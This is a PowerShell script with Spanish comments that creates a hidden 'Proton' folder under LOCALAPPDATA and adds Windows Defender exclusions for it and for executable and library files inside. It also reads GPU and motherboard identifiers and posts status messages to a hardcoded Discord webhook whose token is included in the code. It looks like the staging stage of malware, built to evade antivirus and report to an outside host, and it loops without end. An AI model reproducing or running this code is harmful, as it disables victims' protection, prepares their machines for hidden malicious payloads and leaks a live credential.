$check = 1
$codeBlock = '```'
$reporte = @()
$GPU_ID = Get-WmiObject -Class Win32_VideoController | Select-Object -ExpandProperty PNPDeviceID
$MOTHER_ID = Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber

function reporte {
    param (
        [string]$mensaje
    )
    
    try {
        $webhook = "https://discord.com/api/webhooks/1345942563156393994/BDkrnul-xcAlgRjHjROWTfB17ZS7HSKvtXeaFWESO-NJQfc4JAfjPb-KO2ZXRQWIM9nX"
        $body = @{
            content = $mensaje
        }

        $jsonData = $body | ConvertTo-Json -Depth 3        
        Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonData -ContentType "application/json; charset=utf-8"
    }
    catch {
        Write-Host "Ocurrió un error al enviar el reporte: $($_.Exception.Message)"
    }
}

while ($check -eq 1) {
    try {
        # Ruta de la aplicación
        $root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Proton"

        # Verifica si la carpeta existe; si no, la crea
        if (-not (Test-Path $root)) {
            New-Item -Path $root -ItemType Directory
            $reporte += "Directorio: $root"
        }

        # Establece la carpeta como oculta
        Set-ItemProperty -Path $root -Name Attributes -Value Hidden

        if (-not ($folder.Attributes -band [System.IO.FileAttributes]::Hidden)) {
            Set-ItemProperty -Path $root -Name Attributes -Value Hidden
            $reporte += "Directorio Oculto: True"
        }

        # Definir exclusiones
        $Exclusiones = @(".exe", ".dll", ".lib")

        try {
            foreach ($tipo in $Exclusiones) {
                # Agrega las exclusiones al antivirus
                Add-MpPreference -ExclusionPath $root
                Add-MpPreference -ExclusionPath "$root\$tipo"
                Add-MpPreference -ExclusionPath "$root\\$tipo"
                Add-MpPreference -ExclusionPath "$root\.\$tipo"
            }
            $reporte += "Exclusiones al Defender: Agregadas"
        }
        catch {
            $reporte += "Exclusiones al Defender: Fallidas"
        }
    }
    catch {
        reporte "REPORTE: ERROR`n$($_.Exception.Message)"
    }
}
